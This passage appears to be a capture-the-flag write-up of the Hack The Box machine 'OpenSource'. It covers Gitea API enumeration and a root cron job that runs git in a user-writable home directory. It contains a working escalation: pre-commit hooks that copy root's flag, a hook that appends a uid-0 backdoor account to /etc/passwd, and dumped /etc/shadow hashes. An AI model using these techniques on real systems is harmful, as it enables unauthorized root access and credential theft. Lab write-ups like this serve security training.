![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2013.png)

```bash
┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ cat swagger.v1.json| jq '. | keys'
[
  "basePath",
  "consumes",
  "definitions",
  "info",
  "paths",
  "produces",
  "responses",
  "schemes",
  "security",
  "securityDefinitions",
  "swagger"
]

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ cat swagger.v1.json| jq '.paths | keys'
[
  "/admin/cron",
  "/admin/cron/{task}",
  "/admin/orgs",
  "/admin/unadopted",
  "/admin/unadopted/{owner}/{repo}",
  "/admin/users",
  "/admin/users/{username}",
  "/admin/users/{username}/keys",
  "/admin/users/{username}/keys/{id}",
  "/admin/users/{username}/orgs",
  "/admin/users/{username}/repos",
  "/markdown",
  "/markdown/raw",
  "/nodeinfo",
  "/notifications",
  "/notifications/new",
  "/notifications/threads/{id}",
  "/org/{org}/repos",
  "/orgs",
  "/orgs/{org}",
  "/orgs/{org}/hooks",
  "/orgs/{org}/hooks/",
  "/orgs/{org}/hooks/{id}",
  "/orgs/{org}/labels",
  "/orgs/{org}/labels/{id}",
  "/orgs/{org}/members",
  "/orgs/{org}/members/{username}",
  "/orgs/{org}/public_members",
  "/orgs/{org}/public_members/{username}",
  "/orgs/{org}/repos",
  "/orgs/{org}/teams",
  "/orgs/{org}/teams/search",
  "/repos/issues/search",
  "/repos/migrate",
  "/repos/search",
  "/repos/{owner}/{repo}",
  "/repos/{owner}/{repo}/archive/{archive}",
  "/repos/{owner}/{repo}/assignees",
  "/repos/{owner}/{repo}/branch_protections",
  "/repos/{owner}/{repo}/branch_protections/{name}",
  "/repos/{owner}/{repo}/branches",
  "/repos/{owner}/{repo}/branches/{branch}",
  "/repos/{owner}/{repo}/collaborators",
  "/repos/{owner}/{repo}/collaborators/{collaborator}",
  "/repos/{owner}/{repo}/commits",
  "/repos/{owner}/{repo}/commits/{ref}/status",
  "/repos/{owner}/{repo}/commits/{ref}/statuses",
  "/repos/{owner}/{repo}/contents",
  "/repos/{owner}/{repo}/contents/{filepath}",
  "/repos/{owner}/{repo}/editorconfig/{filepath}",
  "/repos/{owner}/{repo}/forks",
  "/repos/{owner}/{repo}/git/blobs/{sha}",
  "/repos/{owner}/{repo}/git/commits/{sha}",
  "/repos/{owner}/{repo}/git/commits/{sha}.{diffType}",
  "/repos/{owner}/{repo}/git/notes/{sha}",
  "/repos/{owner}/{repo}/git/refs",
  "/repos/{owner}/{repo}/git/refs/{ref}",
  "/repos/{owner}/{repo}/git/tags/{sha}",
  "/repos/{owner}/{repo}/git/trees/{sha}",
  "/repos/{owner}/{repo}/hooks",
  "/repos/{owner}/{repo}/hooks/git",
  "/repos/{owner}/{repo}/hooks/git/{id}",
  "/repos/{owner}/{repo}/hooks/{id}",
  "/repos/{owner}/{repo}/hooks/{id}/tests",
  "/repos/{owner}/{repo}/issue_templates",
  "/repos/{owner}/{repo}/issues",
  "/repos/{owner}/{repo}/issues/comments",
  "/repos/{owner}/{repo}/issues/comments/{id}",
  "/repos/{owner}/{repo}/issues/comments/{id}/reactions",
  "/repos/{owner}/{repo}/issues/{index}",
  "/repos/{owner}/{repo}/issues/{index}/comments",
  "/repos/{owner}/{repo}/issues/{index}/comments/{id}",
  "/repos/{owner}/{repo}/issues/{index}/deadline",
  "/repos/{owner}/{repo}/issues/{index}/labels",
  "/repos/{owner}/{repo}/issues/{index}/labels/{id}",
  "/repos/{owner}/{repo}/issues/{index}/reactions",
  "/repos/{owner}/{repo}/issues/{index}/stopwatch/delete",
  "/repos/{owner}/{repo}/issues/{index}/stopwatch/start",
  "/repos/{owner}/{repo}/issues/{index}/stopwatch/stop",
  "/repos/{owner}/{repo}/issues/{index}/subscriptions",
  "/repos/{owner}/{repo}/issues/{index}/subscriptions/check",
  "/repos/{owner}/{repo}/issues/{index}/subscriptions/{user}",
  "/repos/{owner}/{repo}/issues/{index}/timeline",
  "/repos/{owner}/{repo}/issues/{index}/times",
  "/repos/{owner}/{repo}/issues/{index}/times/{id}",
  "/repos/{owner}/{repo}/keys",
  "/repos/{owner}/{repo}/keys/{id}",
  "/repos/{owner}/{repo}/labels",
  "/repos/{owner}/{repo}/labels/{id}",
  "/repos/{owner}/{repo}/languages",
  "/repos/{owner}/{repo}/milestones",
  "/repos/{owner}/{repo}/milestones/{id}",
  "/repos/{owner}/{repo}/mirror-sync",
  "/repos/{owner}/{repo}/notifications",
  "/repos/{owner}/{repo}/pulls",
  "/repos/{owner}/{repo}/pulls/{index}",
  "/repos/{owner}/{repo}/pulls/{index}.{diffType}",
  "/repos/{owner}/{repo}/pulls/{index}/commits",
  "/repos/{owner}/{repo}/pulls/{index}/merge",
  "/repos/{owner}/{repo}/pulls/{index}/requested_reviewers",
  "/repos/{owner}/{repo}/pulls/{index}/reviews",
  "/repos/{owner}/{repo}/pulls/{index}/reviews/{id}",
  "/repos/{owner}/{repo}/pulls/{index}/reviews/{id}/comments",
  "/repos/{owner}/{repo}/pulls/{index}/reviews/{id}/dismissals",
  "/repos/{owner}/{repo}/pulls/{index}/reviews/{id}/undismissals",
  "/repos/{owner}/{repo}/pulls/{index}/update",
  "/repos/{owner}/{repo}/raw/{filepath}",
  "/repos/{owner}/{repo}/releases",
  "/repos/{owner}/{repo}/releases/tags/{tag}",
  "/repos/{owner}/{repo}/releases/{id}",
  "/repos/{owner}/{repo}/releases/{id}/assets",
  "/repos/{owner}/{repo}/releases/{id}/assets/{attachment_id}",
  "/repos/{owner}/{repo}/reviewers",
  "/repos/{owner}/{repo}/signing-key.gpg",
  "/repos/{owner}/{repo}/stargazers",
  "/repos/{owner}/{repo}/statuses/{sha}",
  "/repos/{owner}/{repo}/subscribers",
  "/repos/{owner}/{repo}/subscription",
  "/repos/{owner}/{repo}/tags",
  "/repos/{owner}/{repo}/tags/{tag}",
  "/repos/{owner}/{repo}/teams",
  "/repos/{owner}/{repo}/teams/{team}",
  "/repos/{owner}/{repo}/times",
  "/repos/{owner}/{repo}/times/{user}",
  "/repos/{owner}/{repo}/topics",
  "/repos/{owner}/{repo}/topics/{topic}",
  "/repos/{owner}/{repo}/transfer",
  "/repos/{owner}/{repo}/transfer/accept",
  "/repos/{owner}/{repo}/transfer/reject",
  "/repos/{owner}/{repo}/wiki/new",
  "/repos/{owner}/{repo}/wiki/page/{pageName}",
  "/repos/{owner}/{repo}/wiki/pages",
  "/repos/{owner}/{repo}/wiki/revisions/{pageName}",
  "/repos/{template_owner}/{template_repo}/generate",
  "/repositories/{id}",
  "/settings/api",
  "/settings/attachment",
  "/settings/repository",
  "/settings/ui",
  "/signing-key.gpg",
  "/teams/{id}",
  "/teams/{id}/members",
  "/teams/{id}/members/{username}",
  "/teams/{id}/repos",
  "/teams/{id}/repos/{org}/{repo}",
  "/topics/search",
  "/user",
  "/user/applications/oauth2",
  "/user/applications/oauth2/{id}",
  "/user/emails",
  "/user/followers",
  "/user/following",
  "/user/following/{username}",
  "/user/gpg_key_token",
  "/user/gpg_key_verify",
  "/user/gpg_keys",
  "/user/gpg_keys/{id}",
  "/user/keys",
  "/user/keys/{id}",
  "/user/orgs",
  "/user/repos",
  "/user/settings",
  "/user/starred",
  "/user/starred/{owner}/{repo}",
  "/user/stopwatches",
  "/user/subscriptions",
  "/user/teams",
  "/user/times",
  "/users/search",
  "/users/{follower}/following/{followee}",
  "/users/{username}",
  "/users/{username}/followers",
  "/users/{username}/following",
  "/users/{username}/gpg_keys",
  "/users/{username}/heatmap",
  "/users/{username}/keys",
  "/users/{username}/orgs",
  "/users/{username}/orgs/{org}/permissions",
  "/users/{username}/repos",
  "/users/{username}/starred",
  "/users/{username}/subscriptions",
  "/users/{username}/tokens",
  "/users/{username}/tokens/{token}",
  "/version"
]

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ curl http://127.0.0.1:3001/api/v1/admin/users -b 'i_like_gitea=67f291ec4a98ee7d; lang=en-US; _csrf=3sQ-BeN7FDubtNzs1q2BFRD6Jbk6MTY1MzMwNTYyODg0MjYyMzkzOQ'
Missing CSRF token.

┌──(maoutis㉿kali)-[~/CTF/HTB/OpenSource/loot]
└─$ curl http://127.0.0.1:3001/api/v1/admin/users -H 'X-CSRF-Token: Ey7n0_xWovSqiEa6pA2Q07LYO6Q6MTY1MzMwNjUxMzcwNzIyMTI5Mw' -b 'i_like_gitea=67f291ec4a98ee7d; lang=en-US; _csrf=3sQ-BeN7FDubtNzs1q2BFRD6Jbk6MTY1MzMwNTYyODg0MjYyMzkzOQ'
{"message":"user should be the site admin","url":"http://opensource.htb:3000/api/swagger"}
```

# Privilege Escalation

## Local Enumeration

Enumerated local users:

```bash
dev01@opensource:~$ ls /home
dev01  git

dev01@opensource:~$ cat /etc/passwd | grep -E '/sh|/bash'
root:x:0:0:root:/root:/bin/bash
dev01:x:1000:1000:dev01:/home/dev01:/bin/bash
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
registry:x:995:995::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:994:994::/var/opt/gitlab/prometheus:/bin/sh
git:x:111:113:Git Version Control,,,:/home/git:/bin/bash
```

Enumerated running services:

```bash
dev01@opensource:/opt/gitlab$ netstat -polentau | grep -v ESTABLISHED
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      0          28408      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      0          39903      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      0          29495      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      0          31088      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      0          32449      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      0          34276      -                    off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      101        18899      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      0          35832      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          22257      -                    off (0.00/0/0)
tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      0          37765      -                    off (0.00/0/0)
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      111        24208      -                    off (0.00/0/0)
tcp        0      1 10.129.68.116:45676     1.1.1.1:53              SYN_SENT    101        433430     -                    on (5.35/3/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           101        18898      -                    off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          19903      -                    off (0.00/0/0)
```

Enumerated root processes with pspy:

```bash
2022/05/23 15:31:01 CMD: UID=0    PID=23541  | /bin/bash /usr/local/bin/git-sync
2022/05/23 15:31:01 CMD: UID=0    PID=23540  | /bin/sh -c /usr/local/bin/git-sync
2022/05/23 15:31:01 CMD: UID=0    PID=23539  | /usr/sbin/CRON -f
2022/05/23 15:31:01 CMD: UID=???  PID=23542  | ???
2022/05/23 15:31:01 CMD: UID=0    PID=23545  | git commit -m Backup for 2022-05-23
2022/05/23 15:31:01 CMD: UID=0    PID=23547  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
2022/05/23 15:31:01 CMD: UID=0    PID=23546  | git push origin main
2022/05/23 15:31:01 CMD: UID=0    PID=23548  | /sbin/modprobe -q -- net-pf-10
...
dev01@opensource:~$ ls -al /usr/local/bin/git-sync
-rwxr-xr-x 1 root root 239 Mar 23 00:26 /usr/local/bin/git-sync
dev01@opensource:~$ cat /usr/local/bin/git-sync
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi

dev01@opensource:~$ ls -al
total 52
drwxr-xr-x 9 dev01 dev01 4096 May 23 15:35 .
drwxr-xr-x 4 root  root  4096 May 16 12:51 ..
lrwxrwxrwx 1 dev01 dev01    9 Mar 23 01:21 .bash_history -> /dev/null
-rw-r--r-- 1 dev01 dev01  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dev01 dev01 3771 Apr  4  2018 .bashrc
drwx------ 2 dev01 dev01 4096 May  4 16:35 .cache
drwxrwxr-x 3 dev01 dev01 4096 May 23 15:35 .config
drwxrwxr-x 8 dev01 dev01 4096 May 23 15:35 .git
drwx------ 3 dev01 dev01 4096 May 23 15:35 .gnupg
drwxrwxr-x 3 dev01 dev01 4096 May  4 16:35 .local
-rw-r--r-- 1 dev01 dev01  807 Apr  4  2018 .profile
drwx------ 3 dev01 dev01 4096 May 23 15:08 snap
drwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh
-rw-r----- 1 dev01 dev01   33 May 23 09:04 user.txt
dev01@opensource:~$ ls -al .git/
total 56
drwxrwxr-x  8 dev01 dev01 4096 May 23 15:35 .
drwxr-xr-x  9 dev01 dev01 4096 May 23 15:35 ..
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 branches
-rw-r--r--  1 dev01 dev01   22 May 23 15:35 COMMIT_EDITMSG
-rw-rw-r--  1 dev01 dev01  269 May 23 15:34 config
-rw-rw-r--  1 dev01 dev01   73 Mar 23 01:18 description
-rw-rw-r--  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD
-rw-rw-r--  1 dev01 dev01   21 May 23 15:35 HEAD
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 hooks
-rw-rw-r--  1 dev01 dev01 1421 May 23 15:35 index
drwxrwxr-x  2 dev01 dev01 4096 May  4 16:35 info
drwxr-xr-x  3 dev01 dev01 4096 May  4 16:35 logs
drwxrwxr-x 55 dev01 dev01 4096 May 23 15:33 objects
drwxrwxr-x  5 dev01 dev01 4096 May  4 16:35 refs
```

## Git hook privilege escalation
- [Git - Git Hooks](https://git-scm.com/book/it/v2/Customizing-Git-Git-Hooks)
- [Git hooks example - GitKraken Client Documentation](https://support.gitkraken.com/working-with-repositories/githooksexample/)

>[!tip]
>Git hooks are **special scripts** **executed before** the actual **git action**, like git commit or git push. Because root executes some git actions on user writable git directory, it is possible to inject git hooks to execute command with high privileges.

Custom git hook:

```bash
dev01@opensource:~$ cat /home/dev01/.git/hooks/pre-commit
#!/bin/sh
cp /root/root.txt /dev/shm/root.txt
chmod 777 /dev/shm/root.txt
exit 1
```

PoC:

```bash
dev01@opensource:~$ ls -al /dev/shm/root.txt
-rwxrwxrwx 1 root root 33 May 23 15:51 /dev/shm/root.txt
dev01@opensource:~$ cat /dev/shm/root.txt
2d33ed1fbb89e74c52a98a8ca3ec9147
```

Privilege escalation PoC:

```bash
dev01@opensource:~$ nano .git/hooks/pre-commit
dev01@opensource:~$ cat .git/hooks/pre-commit
#!/bin/bash
echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
exit 1
dev01@opensource:~$ chmod +x .git/hooks/pre-commit
```

Created a file in order to force **/usr/local/bin/git-sync** to execute git:

```bash
dev01@opensource:~$ echo '' > /home/dev01/void
```

Escalated to root:

```bash
...
2022/05/23 16:47:01 CMD: UID=0    PID=26733  | /bin/bash /usr/local/bin/git-sync
2022/05/23 16:47:01 CMD: UID=0    PID=26732  | /bin/sh -c /usr/local/bin/git-sync
2022/05/23 16:47:01 CMD: UID=0    PID=26731  | /usr/sbin/CRON -f
2022/05/23 16:47:01 CMD: UID=0    PID=26736  | git add .
2022/05/23 16:47:01 CMD: UID=0    PID=26737  | git commit -m Backup for 2022-05-23
2022/05/23 16:47:01 CMD: UID=0    PID=26739  |
2022/05/23 16:47:01 CMD: UID=0    PID=26738  | /bin/bash .git/hooks/pre-commit
2022/05/23 16:47:01 CMD: UID=0    PID=26740  | /bin/bash /usr/local/bin/git-sync
2022/05/23 16:47:01 CMD: UID=0    PID=26741  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
...

dev01@opensource:~$ cat /etc/passwd | grep root2
root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash

dev01@opensource:~$ su root2
Password:
root@opensource:/home/dev01# id; hostname; cat /root/root.txt
uid=0(root) gid=0(root) groups=0(root)
opensource
d0216d25a9d00f8ea03f37bea888f364
```

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2014.png)

# Trophy

![OpenSource%20f45f07afdacd4cfaab930db6a8f3f493](../../zzz_res/attachments/OpenSource%20f45f07afdacd4cfaab930db6a8f3f493%2015.png)

>[!success]
>**User.txt**
>d50f635f2d44b8fa66270936d58258f1

>[!success]
>**Root.txt**
>2d33ed1fbb89e74c52a98a8ca3ec9147

**/etc/shadow**

```bash
root@opensource:/home/dev01# cat /etc/shadow | grep '\$'
root:$6$5sA85UVX$HupltM.bMqXkLc269pHDk1lryc4y5LV0FPMtT3x.yUdbe3mGziC8aUXWRQ2K3jX8mq5zItFAkAfDgPzH8EQ1C/:19072:0:99999:7:::
dev01:$6$KxPkBXel$7cqEmnerc0RmIaUGVdGLXlbC61.2x5bY0DLC/j2VDHG3mAaqeWFfQiuHOXmQss91XNn0FybSdfl51vFfKuwRh/:19073:0:99999:7:::
```